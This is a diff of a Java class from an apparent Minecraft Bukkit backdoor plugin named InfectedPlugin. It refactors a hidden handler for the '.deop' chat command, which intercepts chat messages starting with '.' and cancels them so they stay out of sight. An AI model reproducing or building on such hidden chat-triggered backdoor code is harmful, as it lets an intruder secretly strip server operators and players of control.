@@ -1,10 +1,11 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
-import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Server;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_deop extends IP_Command implements Listener
@@ -15,7 +16,6 @@ public class Command_deop extends IP_Command implements Listener
         String message = event.getMessage();
         final Player p = event.getPlayer();
         Server server = Bukkit.getServer();
-        boolean cancel = false;
 
         if (message.startsWith("."))
         {
@@ -30,7 +30,7 @@ public class Command_deop extends IP_Command implements Listener
                 if (args.length == 1)
                 {
                     p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
-                    cancel = true;
+                    event.setCancelled(true);
                     return;
                 }
                 try
